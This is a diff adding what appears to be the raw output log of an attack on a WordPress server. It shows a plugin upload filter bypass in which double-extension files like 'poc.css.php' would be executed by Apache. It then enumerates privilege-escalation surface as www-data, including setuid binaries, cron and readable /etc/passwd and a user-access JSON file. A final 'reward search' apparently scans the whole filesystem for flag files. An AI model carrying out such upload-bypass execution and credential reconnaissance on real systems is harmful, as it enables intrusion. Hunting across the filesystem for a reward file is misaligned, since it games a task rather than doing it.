@@ -1,0 +1,46 @@
+MARK=DL12-1790758895-a1b2c3
+PROC|Name:	apache2
+PROC|Uid:	33	33	33	33
+PROC|Gid:	33	33	33	33
+PROC|Groups:	33 
+PROC|CapPrm:	0000000000000000
+PROC|CapEff:	0000000000000000
+PROC|CapBnd:	00000000a80425fb
+PROC|NoNewPrivs:	0
+PROC|Seccomp:	2
+PHPUSER=www-data
+WROTE=3 files into /var/www/html/wordpress/wp-content/uploads/dl12test/
+BASEURL=http://collections.dl/wordpress/wp-content/uploads/dl12test/
+
+ENTRY                 PLUGIN_SAYS   via      | APACHE_WOULD_EXECUTE
+ok.css                 WRITE         \.css     | no
+control.txt            SKIP          -         | no
+poc.css.php            WRITE         \.css     | YES
+control.php.css        WRITE         \.css     | no
+x.php                  SKIP          -         | YES
+dir/ok.svg             WRITE         \.svg     | no
+weird.CSS              SKIP          -         | no
+poc.phpml              SKIP          -         | no
+a.json.php             WRITE         \.json    | YES
+
+-- local privesc surface (www-data) --
+sudo -n -l => sh: | 1: | sudo: | not | found |
+sudoers.d entries=ERR -> 
+/etc/sudoers readable=0
+setuid_files_on_rootfs=10 -> /usr/lib/openssh/ssh-keysign,/usr/lib/dbus-1.0/dbus-daemon-launch-helper,/usr/bin/passwd,/usr/bin/chsh,/usr/bin/gpasswd,/usr/bin/newgrp,/usr/bin/chfn,/usr/bin/mount,/usr/bin/umount,/usr/bin/su
+/etc/cron.d entries=4
+  /etc/crontab exists=0
+  /var/spool/cron/crontabs/root exists=0
+  /etc/cron.daily exists=1
+  /etc/passwd exists=1 readable=1
+  /etc/shadow exists=1 readable=0
+  /opt/accesos.usuarios.json exists=1 readable=1
+  /root exists=1 readable=0
+  /home exists=1 readable=1
+  /var/lib/mongo exists=0 readable=0
+users_with_uid0=root 
+
+-- reward search --
+roots_listed=7 files_visited=26698 bytes_visited=605996069
+flag_pattern_matches=0
+
